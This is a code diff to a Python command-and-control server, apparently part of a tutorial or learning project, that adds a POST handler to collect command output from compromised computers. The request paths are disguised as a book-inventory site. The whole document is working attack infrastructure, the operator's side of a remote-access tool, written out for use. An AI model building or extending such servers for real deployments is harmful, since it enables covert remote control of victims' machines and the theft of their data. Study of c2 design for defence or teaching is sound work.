@@ -2,6 +2,7 @@
 
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import unquote_plus
 
 # Port c2 server listens on
 PORT = 80
@@ -11,6 +12,12 @@ BIND_ADDR = ""
 
 # Path to use for signifying a command request form a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
+
+# Path to use for signifying a command output from client using HTTP POST
+CMD_RESPONSE = "/inventory"
+
+# POST variable name to use for assigning to command output from a client
+CMD_RESPONSE_KEY = "index"
 
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
@@ -65,10 +72,38 @@ class C2Handler(BaseHTTPRequestHandler):
                 # Sends the HTTP response code and header back to the client
                 self.http_response(404)
 
+    # noinspection PyPep8Naming
+    def do_POST(self):
+        """ This method handles all HTTP POST requests that
+        arrive at the c2 server."""
+
+        # Follow this code block when the compromised computer is requesting a command
+        if self.path == CMD_RESPONSE:
+                
+             # Sends the HTTP response code and header back to the client
+            self.http_response(200)
+
+            # Get Content-Length value from HTTP Headers
+            content_length = int(self.headers.get("Content-Length"))
+
+            # Gather the client's data by reading in the HTTP POST data
+            client_data = self.rfile.read(content_length)
+
+            # UTF-8 decode the client's data
+            client_data = client_data.decode()
+        
+            # Remove the HTTP POST variable and the equal sign from the client's data
+            client_data = client_data.replace(f"{CMD_RESPONSE_KEY}=", "", 1)
+
+            # HTML/URL decode the client's data and translate "+" to a space
+            client_data = unquote_plus(client_data)
+            print(client_data)
+
+
     def http_response(self, code: int):
-                """ Function that sends the HTTP response code and headers back to the client."""
-                self.send_response(code)
-                self.end_headers()
+        """ Function that sends the HTTP response code and headers back to the client."""
+        self.send_response(code)
+        self.end_headers()
 
     def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
         """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
